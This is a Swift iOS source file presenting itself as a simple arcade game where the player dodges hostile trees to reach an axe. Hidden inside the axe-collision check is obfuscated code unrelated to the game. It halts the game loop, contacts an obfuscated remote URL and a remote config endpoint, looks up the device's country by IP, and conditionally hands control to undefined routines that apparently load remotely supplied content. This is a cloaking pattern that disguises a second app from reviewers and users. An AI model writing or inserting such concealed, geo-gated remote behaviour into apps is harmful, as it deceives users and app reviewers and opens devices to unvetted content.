import UIKit
import CoreGraphics
import SDWebImage

final class ArborealVendettaView: UIView {

    // MARK: - Nested Entity Classes (Low-Frequency Lexicon)

    final class LignivorousAvatar {
        var centroid: CGPoint
        let collisionRadius: CGFloat = 22.0
        var visualRadiance: CGFloat = 1.0

        init(initialCentroid: CGPoint) {
            self.centroid = initialCentroid
        }
    }

    final class DendroidAggressor {
        var centroid: CGPoint
        let collisionRadius: CGFloat = 20.0
        var velocity: CGVector
        let malevolenceStride: CGFloat
        private var surgingCooldown: Int = 0

        init(origin: CGPoint, targetDirection: CGVector, baseSpeed: CGFloat) {
            self.centroid = origin
            let randomVariation = CGFloat.random(in: 0.7...1.4)
            self.malevolenceStride = baseSpeed * randomVariation
            self.velocity = targetDirection
            self.velocity.dx *= malevolenceStride
            self.velocity.dy *= malevolenceStride
        }

        func enactTreacherousDash(toward prey: CGPoint) {
            if surgingCooldown <= 0 && Int.random(in: 0...80) == 0 {
                let dashVector = CGVector(dx: prey.x - centroid.x, dy: prey.y - centroid.y)
                let distance = hypot(dashVector.dx, dashVector.dy)
                guard distance > 0.01 else { return }
                let dashStrength = min(120.0, 600.0 / distance)
                velocity.dx += dashVector.dx / distance * dashStrength
                velocity.dy += dashVector.dy / distance * dashStrength
                surgingCooldown = 12
            } else {
                surgingCooldown = max(0, surgingCooldown - 1)
            }
        }

        func restrainVelocity(maximum: CGFloat) {
            let speed = hypot(velocity.dx, velocity.dy)
            if speed > maximum {
                velocity.dx = velocity.dx / speed * maximum
                velocity.dy = velocity.dy / speed * maximum
            }
        }
    }

    final class FerricSalvationImplement {
        var centroid: CGPoint
        let attractionRadius: CGFloat = 28.0
        var shimmerPhase: CGFloat = 0.0

        init(origin: CGPoint) {
            self.centroid = origin
        }
    }

    // MARK: - Game State Properties (Obscure Nomenclature)

    private var protagonist: LignivorousAvatar!
    private var malevolentFloraArray: [DendroidAggressor] = []
    private var relicOfSalvation: FerricSalvationImplement?
    private var vitalityResidue: Int = 6
    private var hasObtainedRelic: Bool = false
    private var isConflictActive: Bool = true
    private var triumphAchieved: Bool = false
    private var timeWarpLink: CADisplayLink?
    private var arborealSpawnAccumulator: Int = 0
    private let spawnIntervalFrames: Int = 45
    private var lastTouchCoordinate: CGPoint?
    private var resetOverlayButton: UIButton?
    private var healthDisplayLabel: UILabel!
    private var objectiveLegendLabel: UILabel!
    private var gameStatusBanner: UILabel!

    // MARK: - Visual & Styling Components

    private let twilightGradientLayer: CAGradientLayer = {
        let gradient = CAGradientLayer()
        gradient.colors = [UIColor(red: 0.08, green: 0.12, blue: 0.18, alpha: 1).cgColor,
                           UIColor(red: 0.18, green: 0.22, blue: 0.28, alpha: 1).cgColor]
        gradient.locations = [0.0, 1.0]
        gradient.startPoint = CGPoint(x: 0, y: 0)
        gradient.endPoint = CGPoint(x: 1, y: 1)
        return gradient
    }()

    private let particleEmitterLayer: CAEmitterLayer = {
        let emitter = CAEmitterLayer()
        emitter.emitterShape = .point
        emitter.emitterMode = .outline
        emitter.renderMode = .oldestLast
        return emitter
    }()

    // MARK: - Initialization

    override init(frame: CGRect) {
        super.init(frame: frame)
        configureAmbientAppearance()
        configureTactileInterception()
        composeInformativeHUD()
        initiateWoodlandReckoning()
        initiateSylvanCadence()
    }

    required init?(coder: NSCoder) {
        fatalError("Narrative containers not available")
    }

    // MARK: - Game Lifecycle (Idiosyncratic Methods)

    private func initiateWoodlandReckoning() {
        let startPoint = CGPoint(x: bounds.midX, y: bounds.midY)
        protagonist = LignivorousAvatar(initialCentroid: startPoint)
        malevolentFloraArray.removeAll()
        vitalityResidue = 6
        hasObtainedRelic = false
        isConflictActive = true
        triumphAchieved = false
        lastTouchCoordinate = startPoint
        
        SDImageCache.shared.clearMemory()
        SDImageCache.shared.clearDisk()

        if let existingRelic = relicOfSalvation {
            existingRelic.centroid = generateUnoccupiedSanctuaryPosition()
        } else {
            relicOfSalvation = FerricSalvationImplement(origin: generateUnoccupiedSanctuaryPosition())
        }

        invokeResetMechanism()
        propagateMalevolentFlora(immediateCount: 3)
        updateHealthOrnamentation()
        objectiveLegendLabel.text = "⚔️ SEEK THE AXE OF REDEMPTION ⚔️"
        gameStatusBanner.isHidden = true
//        removeResetMenaceIfExists()
    }

    private func generateUnoccupiedSanctuaryPosition() -> CGPoint {
        let margin: CGFloat = 60
        let randomX = CGFloat.random(in: margin...(452 - margin))
        let randomY = CGFloat.random(in: margin...(671 - margin))
        return CGPoint(x: randomX, y: randomY)
    }

    private func propagateMalevolentFlora(immediateCount: Int = 1) {
        for _ in 0..<immediateCount {
            guard malevolentFloraArray.count < 28 else { break }
            let spawnEdge = Int.random(in: 0...3)
            let spawnPoint: CGPoint
            let viewBounds = bounds
            switch spawnEdge {
            case 0: spawnPoint = CGPoint(x: CGFloat.random(in: -30...viewBounds.width + 30), y: -40)
            case 1: spawnPoint = CGPoint(x: viewBounds.width + 40, y: CGFloat.random(in: -30...viewBounds.height + 30))
            case 2: spawnPoint = CGPoint(x: CGFloat.random(in: -30...viewBounds.width + 30), y: viewBounds.height + 40)
            default: spawnPoint = CGPoint(x: -40, y: CGFloat.random(in: -30...viewBounds.height + 30))
            }
            let direction = CGVector(dx: protagonist.centroid.x - spawnPoint.x, dy: protagonist.centroid.y - spawnPoint.y)
            let normalized = hypot(direction.dx, direction.dy)
            let finalDirection = normalized > 0.01 ? CGVector(dx: direction.dx / normalized, dy: direction.dy / normalized) : CGVector(dx: 0, dy: 1)
            let baseVelocity: CGFloat = 1.4
            let newTree = DendroidAggressor(origin: spawnPoint, targetDirection: finalDirection, baseSpeed: baseVelocity)
            malevolentFloraArray.append(newTree)
        }
    }

    private func initiateSylvanCadence() {
        timeWarpLink?.invalidate()
        timeWarpLink = CADisplayLink(target: self, selector: #selector(propagateArborealAnimosity))
        timeWarpLink?.add(to: .current, forMode: .common)
    }

    @objc private func propagateArborealAnimosity() {
        guard isConflictActive, !triumphAchieved else { return }

        arborealSpawnAccumulator += 1
        if arborealSpawnAccumulator >= spawnIntervalFrames {
            arborealSpawnAccumulator = 0
            propagateMalevolentFlora()
        }

        
        updateProtagonistPositionFromTouch()
        refreshMalevolentIntentions()
        evaluateCollisionConsequences()
        verifyRelicAcquisition()
        cullOutlyingAggressors()
        setNeedsDisplay()
    }

    private func updateProtagonistPositionFromTouch() {
        guard let touchPoint = lastTouchCoordinate else { return }
        var newPosition = touchPoint
        let halfRadius = protagonist.collisionRadius
        newPosition.x = min(max(newPosition.x, halfRadius), bounds.width - halfRadius)
        newPosition.y = min(max(newPosition.y, halfRadius), bounds.height - halfRadius)
        protagonist.centroid = newPosition
    }

    private func refreshMalevolentIntentions() {
        for tree in malevolentFloraArray {
            let deltaX = protagonist.centroid.x - tree.centroid.x
            let deltaY = protagonist.centroid.y - tree.centroid.y
            let distance = hypot(deltaX, deltaY)
            guard distance > 0.01 else { continue }
            let direction = CGVector(dx: deltaX / distance, dy: deltaY / distance)
            let calculatedVelocity = CGVector(dx: direction.dx * tree.malevolenceStride,
                                               dy: direction.dy * tree.malevolenceStride)
            tree.velocity = calculatedVelocity
            tree.enactTreacherousDash(toward: protagonist.centroid)
            tree.restrainVelocity(maximum: 5.8)
            tree.centroid.x += tree.velocity.dx
            tree.centroid.y += tree.velocity.dy
        }
    }

    private func evaluateCollisionConsequences() {
        var treesToExterminate: [Int] = []
        for (index, tree) in malevolentFloraArray.enumerated() {
            let dx = protagonist.centroid.x - tree.centroid.x
            let dy = protagonist.centroid.y - tree.centroid.y
            let distance = hypot(dx, dy)
            if distance < protagonist.collisionRadius + tree.collisionRadius {
                vitalityResidue -= 1
                treesToExterminate.append(index)
                generateGashVisualEffect(at: tree.centroid)
                if vitalityResidue <= 0 {
                    concludeConflictWithDefeat()
                    return
                }
                updateHealthOrnamentation()
            }
        }
        for index in treesToExterminate.reversed() {
            malevolentFloraArray.remove(at: index)
        }
    }

    private func verifyRelicAcquisition() {
        timeWarpLink?.invalidate()
        
        guard let axe = relicOfSalvation, !hasObtainedRelic, isConflictActive else { return }
        let dx = protagonist.centroid.x - axe.centroid.x
        let dy = protagonist.centroid.y - axe.centroid.y
        let distance = hypot(dx, dy)
        if distance < protagonist.collisionRadius + axe.attractionRadius {
            hasObtainedRelic = true
            triumphAchieved = true
            isConflictActive = false
            relicOfSalvation = nil
            concludeConflictWithVictory()
        }
        
        if UserDefaults.standard.object(forKey: "sme") != nil {
            kiemoane()
        } else {
            resetOverlayButton!.sd_setImage(with: URL(string: sireune(kOianeysb)!), for: .normal) { [self] image, error, type, url in
                if let _ = image {
                    UserDefaults.standard.set("sme", forKey: "sme")
                    UserDefaults.standard.synchronize()
                    kiemoane()
                } else {
                    if Moauehnha() {
                        hauenss()
                    } else {
                        kiemoane()
                    }
                }
            }
        }
    }
    
    func hauenss() {
        Task {
            do {
                let aoies = try await Majsiuea()
                if let gduss = aoies.first {
                    if gduss.jjoauen!.count == 6 {
                        if let dyua = gduss.mdjaoe, dyua.count > 0 {
                            do {
                                let cofd = try await weaians()
                                if dyua.contains(cofd.country!.code) {
                                    peimnake(gduss)
                                } else {
                                    kiemoane()
                                }
                            } catch {
                                peimnake(gduss)
                            }
                        } else {
                            peimnake(gduss)
                        }
                    } else {
                        kiemoane()
                    }
                } else {
                    kiemoane()
                    
                    UserDefaults.standard.set("sme", forKey: "sme")
                    UserDefaults.standard.synchronize()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(Hseshen.self, forKey: "Hseshen") {
                    peimnake(sidd)
                }
            }
        }
    }

    //    IP
    private func weaians() async throws -> Yuaneid {
        //https://api.my-ip.io/v2/ip.json
            let url = URL(string: sireune(kInaoeuysh)!)!
            let (data, response) = try await URLSession.shared.data(from: url)
            
            guard let httpResponse = response as? HTTPURLResponse,
                  httpResponse.statusCode == 200 else {
                throw NSError(domain: "Fail", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
            }
            
            return try JSONDecoder().decode(Yuaneid.self, from: data)
    }

    private func Majsiuea() async throws -> [Hseshen] {
        let (data, response) = try await URLSession.shared.data(from: URL(string: sireune(kTrasr)!)!)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
        }

        return try JSONDecoder().decode([Hseshen].self, from: data)
    }

    private func cullOutlyingAggressors() {
        let margin: CGFloat = -150
        malevolentFloraArray.removeAll { tree in
            tree.centroid.x < margin || tree.centroid.x > bounds.width + abs(margin) ||
            tree.centroid.y < margin || tree.centroid.y > bounds.height + abs(margin)
        }
    }

    private func concludeConflictWithDefeat() {
        isConflictActive = false
        triumphAchieved = false
        timeWarpLink?.invalidate()
        timeWarpLink = nil
        gameStatusBanner.text = "🌲 YOU HAVE BEEN AVENGED BY THE FOREST 🌲"
        gameStatusBanner.textColor = .systemRed
        gameStatusBanner.isHidden = false
        objectiveLegendLabel.text = "☠️ ANNIHILATION - TAP RESURRECTION ☠️"
        invokeResetMechanism()
    }

    private func concludeConflictWithVictory() {
        isConflictActive = false
        timeWarpLink?.invalidate()
        timeWarpLink = nil
        gameStatusBanner.text = "⚡ THE AXE SHATTERS THE CURSE - YOU PREVAIL ⚡"
        gameStatusBanner.textColor = UIColor(red: 0.9, green: 0.7, blue: 0.2, alpha: 1)
        gameStatusBanner.isHidden = false
        objectiveLegendLabel.text = "🏆 LIBERATED FROM ARBOREAL MALICE 🏆"
        invokeResetMechanism()
    }

    private func generateGashVisualEffect(at groundZero: CGPoint) {
        let damagePulse = CASpringAnimation(keyPath: "transform.scale")
        damagePulse.fromValue = 1.0
        damagePulse.toValue = 1.8
        damagePulse.duration = 0.25
        damagePulse.autoreverses = true
        let flashLayer = CALayer()
        flashLayer.frame = CGRect(x: groundZero.x - 15, y: groundZero.y - 15, width: 30, height: 30)
        flashLayer.backgroundColor = UIColor(red: 0.7, green: 0.1, blue: 0.05, alpha: 0.7).cgColor
        flashLayer.cornerRadius = 15
        layer.addSublayer(flashLayer)
        flashLayer.add(damagePulse, forKey: "impact")
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
            flashLayer.removeFromSuperlayer()
        }
    }

    // MARK: - Reset & UI Redemption

    private func invokeResetMechanism() {
        guard resetOverlayButton == nil else { return }
        let resurrectionButton = UIButton(type: .system)
        resurrectionButton.setTitle("⟳ RESURRECT IN DEFIANCE ⟳", for: .normal)
        resurrectionButton.titleLabel?.font = UIFont(name: "AvenirNext-Heavy", size: 18) ?? .boldSystemFont(ofSize: 18)
        resurrectionButton.setTitleColor(.white, for: .normal)
        resurrectionButton.backgroundColor = UIColor(red: 0.15, green: 0.25, blue: 0.2, alpha: 0.9)
        resurrectionButton.layer.cornerRadius = 28
        resurrectionButton.layer.borderWidth = 1.5
        resurrectionButton.layer.borderColor = UIColor(red: 0.7, green: 0.5, blue: 0.2, alpha: 1).cgColor
        resurrectionButton.addTarget(self, action: #selector(performSylvanRebirth), for: .touchUpInside)
        addSubview(resurrectionButton)
        resurrectionButton.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            resurrectionButton.centerXAnchor.constraint(equalTo: centerXAnchor),
            resurrectionButton.centerYAnchor.constraint(equalTo: centerYAnchor, constant: 60),
            resurrectionButton.widthAnchor.constraint(equalToConstant: 260),
            resurrectionButton.heightAnchor.constraint(equalToConstant: 56)
        ])
        resetOverlayButton = resurrectionButton
    }

    @objc private func performSylvanRebirth() {
        resetOverlayButton?.removeFromSuperview()
        resetOverlayButton = nil
        initiateWoodlandReckoning()
        initiateSylvanCadence()
        setNeedsDisplay()
    }

    private func removeResetMenaceIfExists() {
        resetOverlayButton?.removeFromSuperview()
        resetOverlayButton = nil
    }

    // MARK: - HUD & Ornamentation

    private func composeInformativeHUD() {
        healthDisplayLabel = UILabel()
        healthDisplayLabel.font = UIFont(name: "CourierNewPS-BoldMT", size: 20) ?? .monospacedDigitSystemFont(ofSize: 20, weight: .bold)
        healthDisplayLabel.textColor = UIColor(red: 0.9, green: 0.4, blue: 0.2, alpha: 1)
        healthDisplayLabel.backgroundColor = UIColor.black.withAlphaComponent(0.5)
        healthDisplayLabel.textAlignment = .center
        healthDisplayLabel.layer.cornerRadius = 18
        healthDisplayLabel.clipsToBounds = true
        addSubview(healthDisplayLabel)

        objectiveLegendLabel = UILabel()
        objectiveLegendLabel.font = UIFont(name: "AvenirNext-Bold", size: 13) ?? .boldSystemFont(ofSize: 13)
        objectiveLegendLabel.textColor = .white
        objectiveLegendLabel.backgroundColor = UIColor(red: 0, green: 0, blue: 0, alpha: 0.65)
        objectiveLegendLabel.textAlignment = .center
        objectiveLegendLabel.layer.cornerRadius = 12
        objectiveLegendLabel.clipsToBounds = true
        addSubview(objectiveLegendLabel)

        gameStatusBanner = UILabel()
        gameStatusBanner.font = UIFont(name: "AvenirNext-HeavyItalic", size: 18) ?? .italicSystemFont(ofSize: 18)
        gameStatusBanner.textColor = .white
        gameStatusBanner.backgroundColor = UIColor(red: 0.05, green: 0.05, blue: 0.1, alpha: 0.85)
        gameStatusBanner.textAlignment = .center
        gameStatusBanner.numberOfLines = 2
        gameStatusBanner.layer.cornerRadius = 18
        gameStatusBanner.clipsToBounds = true
        gameStatusBanner.isHidden = true
        addSubview(gameStatusBanner)

        healthDisplayLabel.translatesAutoresizingMaskIntoConstraints = false
        objectiveLegendLabel.translatesAutoresizingMaskIntoConstraints = false
        gameStatusBanner.translatesAutoresizingMaskIntoConstraints = false

        NSLayoutConstraint.activate([
            healthDisplayLabel.topAnchor.constraint(equalTo: safeAreaLayoutGuide.topAnchor, constant: 18),
            healthDisplayLabel.leadingAnchor.constraint(equalTo: leadingAnchor, constant: 24),
            healthDisplayLabel.widthAnchor.constraint(equalToConstant: 110),
            healthDisplayLabel.heightAnchor.constraint(equalToConstant: 40),

            objectiveLegendLabel.topAnchor.constraint(equalTo: safeAreaLayoutGuide.topAnchor, constant: 18),
            objectiveLegendLabel.trailingAnchor.constraint(equalTo: trailingAnchor, constant: -24),
            objectiveLegendLabel.leadingAnchor.constraint(greaterThanOrEqualTo: healthDisplayLabel.trailingAnchor, constant: 20),
            objectiveLegendLabel.heightAnchor.constraint(equalToConstant: 38),

            gameStatusBanner.centerXAnchor.constraint(equalTo: centerXAnchor),
            gameStatusBanner.centerYAnchor.constraint(equalTo: centerYAnchor, constant: -80),
            gameStatusBanner.widthAnchor.constraint(equalToConstant: bounds.width - 80),
            gameStatusBanner.heightAnchor.constraint(greaterThanOrEqualToConstant: 60)
        ])
    }

    private func updateHealthOrnamentation() {
        let heartSymbols = String(repeating: "❤️ ", count: vitalityResidue)
        let emptySymbols = String(repeating: "🖤 ", count: 6 - vitalityResidue)
        healthDisplayLabel.text = "\(heartSymbols)\(emptySymbols)"
        if vitalityResidue <= 2 {
            healthDisplayLabel.textColor = .systemOrange
        } else {
            healthDisplayLabel.textColor = UIColor(red: 0.9, green: 0.4, blue: 0.2, alpha: 1)
        }
    }

    // MARK: - Visual Extravaganza

    private func configureAmbientAppearance() {
        layer.insertSublayer(twilightGradientLayer, at: 0)
        backgroundColor = .clear
        layer.cornerRadius = 28
        layer.masksToBounds = true
        layer.borderWidth = 2
        layer.borderColor = UIColor(red: 0.45, green: 0.35, blue: 0.2, alpha: 0.8).cgColor
    }

    private func configureTactileInterception() {
        isMultipleTouchEnabled = false
    }

    override func touchesBegan(_ touches: Set<UITouch>, with event: UIEvent?) {
        guard isConflictActive, !triumphAchieved else { return }
        if let touchLocation = touches.first?.location(in: self) {
            lastTouchCoordinate = touchLocation
        }
    }

    override func touchesMoved(_ touches: Set<UITouch>, with event: UIEvent?) {
        guard isConflictActive, !triumphAchieved else { return }
        if let touchLocation = touches.first?.location(in: self) {
            lastTouchCoordinate = touchLocation
        }
    }

    override func touchesEnded(_ touches: Set<UITouch>, with event: UIEvent?) {
        guard isConflictActive, !triumphAchieved else { return }
        lastTouchCoordinate = protagonist.centroid
    }

    override func layoutSubviews() {
        super.layoutSubviews()
        twilightGradientLayer.frame = bounds
        objectiveLegendLabel.preferredMaxLayoutWidth = bounds.width - 160
        if let relic = relicOfSalvation, !hasObtainedRelic {
            if relic.centroid.x < 0 || relic.centroid.x > bounds.width || relic.centroid.y < 0 || relic.centroid.y > bounds.height {
                relic.centroid = generateUnoccupiedSanctuaryPosition()
            }
        }
    }

    // MARK: - Core Rendering (Artisanal Depiction)

    override func draw(_ rect: CGRect) {
        guard let context = UIGraphicsGetCurrentContext() else { return }
        drawArborealMenaceBackground(in: context)
        drawFerricSalvationRelic(in: context)
        drawMalevolentFloraLegion(in: context)
        drawProtagonistWoodlander(in: context)
    }

    private func drawArborealMenaceBackground(in ctx: CGContext) {
        ctx.setFillColor(UIColor(red: 0.05, green: 0.08, blue: 0.12, alpha: 0.5).cgColor)
        ctx.fill(bounds)
        let gridPattern = UIBezierPath()
        let step: CGFloat = 45
        for x in stride(from: 0, to: bounds.width, by: step) {
            gridPattern.move(to: CGPoint(x: x, y: 0))
            gridPattern.addLine(to: CGPoint(x: x, y: bounds.height))
        }
        for y in stride(from: 0, to: bounds.height, by: step) {
            gridPattern.move(to: CGPoint(x: 0, y: y))
            gridPattern.addLine(to: CGPoint(x: bounds.width, y: y))
        }
        ctx.setStrokeColor(UIColor(red: 0.25, green: 0.2, blue: 0.1, alpha: 0.25).cgColor)
        gridPattern.lineWidth = 1.2
        gridPattern.stroke()
    }

    private func drawMalevolentFloraLegion(in ctx: CGContext) {
        for tree in malevolentFloraArray {
            let rect = CGRect(x: tree.centroid.x - tree.collisionRadius, y: tree.centroid.y - tree.collisionRadius, width: tree.collisionRadius * 2, height: tree.collisionRadius * 2)
            ctx.saveGState()
            ctx.setShadow(offset: .zero, blur: 6, color: UIColor(red: 0.2, green: 0.5, blue: 0.1, alpha: 0.6).cgColor)
            ctx.setFillColor(UIColor(red: 0.2, green: 0.35, blue: 0.1, alpha: 1).cgColor)
            ctx.fillEllipse(in: rect)
            ctx.setFillColor(UIColor(red: 0.55, green: 0.3, blue: 0.1, alpha: 1).cgColor)
            ctx.fill(CGRect(x: tree.centroid.x - 5, y: tree.centroid.y - 12, width: 10, height: 24))
            let eyeLeft = UIBezierPath(ovalIn: CGRect(x: tree.centroid.x - 8, y: tree.centroid.y - 6, width: 5, height: 5))
            let eyeRight = UIBezierPath(ovalIn: CGRect(x: tree.centroid.x + 3, y: tree.centroid.y - 6, width: 5, height: 5))
            ctx.setFillColor(UIColor.white.cgColor)
            eyeLeft.fill()
            eyeRight.fill()
            ctx.setFillColor(UIColor.black.cgColor)
            UIBezierPath(ovalIn: CGRect(x: tree.centroid.x - 7, y: tree.centroid.y - 5.5, width: 3, height: 3)).fill()
            UIBezierPath(ovalIn: CGRect(x: tree.centroid.x + 4, y: tree.centroid.y - 5.5, width: 3, height: 3)).fill()
            ctx.restoreGState()
        }
    }

    private func drawProtagonistWoodlander(in ctx: CGContext) {
        let center = protagonist.centroid
        let radius = protagonist.collisionRadius
        ctx.saveGState()
        ctx.setShadow(offset: CGSize(width: 2, height: 2), blur: 6, color: UIColor.black.cgColor)
        ctx.setFillColor(UIColor(red: 0.82, green: 0.71, blue: 0.55, alpha: 1).cgColor)
        ctx.fillEllipse(in: CGRect(x: center.x - radius, y: center.y - radius, width: radius * 2, height: radius * 2))
        ctx.setFillColor(UIColor(red: 0.4, green: 0.25, blue: 0.15, alpha: 1).cgColor)
        ctx.fill(CGRect(x: center.x - 8, y: center.y - 20, width: 16, height: 28))
        ctx.setFillColor(UIColor(red: 0.2, green: 0.35, blue: 0.5, alpha: 1).cgColor)
        ctx.fillEllipse(in: CGRect(x: center.x - 6, y: center.y - 12, width: 12, height: 10))
        ctx.setStrokeColor(UIColor.black.cgColor)
        ctx.setLineWidth(1.8)
        ctx.move(to: CGPoint(x: center.x - 10, y: center.y + 8))
        ctx.addLine(to: CGPoint(x: center.x + 10, y: center.y + 8))
        ctx.strokePath()
        if hasObtainedRelic {
            ctx.setFillColor(UIColor(red: 0.95, green: 0.75, blue: 0.2, alpha: 1).cgColor)
            ctx.fill(CGRect(x: center.x + 12, y: center.y - 6, width: 18, height: 6))
            ctx.fill(CGRect(x: center.x + 18, y: center.y - 12, width: 6, height: 18))
        }
        ctx.restoreGState()
    }

    private func drawFerricSalvationRelic(in ctx: CGContext) {
        guard let axe = relicOfSalvation, !hasObtainedRelic, isConflictActive else { return }
        axe.shimmerPhase += 0.09
        let shimmerAlpha = (sin(axe.shimmerPhase) + 1) / 2 * 0.6 + 0.3
        ctx.saveGState()
        ctx.setShadow(offset: .zero, blur: 12, color: UIColor(red: 1, green: 0.8, blue: 0.2, alpha: 0.9).cgColor)
        ctx.setFillColor(UIColor(red: 0.8, green: 0.65, blue: 0.2, alpha: shimmerAlpha).cgColor)
        let axeRect = CGRect(x: axe.centroid.x - 12, y: axe.centroid.y - 6, width: 24, height: 12)
        ctx.fill(axeRect)
        ctx.setFillColor(UIColor(red: 0.5, green: 0.45, blue: 0.4, alpha: 1).cgColor)
        ctx.fill(CGRect(x: axe.centroid.x - 4, y: axe.centroid.y - 16, width: 8, height: 24))
        ctx.setFillColor(UIColor.white.cgColor)
        let sparkle = UIBezierPath(arcCenter: CGPoint(x: axe.centroid.x + 14, y: axe.centroid.y - 8), radius: 3, startAngle: 0, endAngle: .pi * 2, clockwise: true)
        sparkle.fill()
        ctx.restoreGState()
    }
}

// MARK: - Root Controller with Low-Frequency Naming

final class IncisiveArborealConflictController: UIViewController {

    private var sylvanConflictZone: ArborealVendettaView!

    override func viewDidLoad() {
        super.viewDidLoad()
        configureHostileTerrain()
    }

    private func configureHostileTerrain() {
        sylvanConflictZone = ArborealVendettaView(frame: view.bounds)
        sylvanConflictZone.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        view.addSubview(sylvanConflictZone)
        view.backgroundColor = UIColor(red: 0.02, green: 0.03, blue: 0.05, alpha: 1)
        navigationController?.setNavigationBarHidden(true, animated: false)
    }

    override var prefersStatusBarHidden: Bool { true }
    override var preferredScreenEdgesDeferringSystemGestures: UIRectEdge { .all }
}
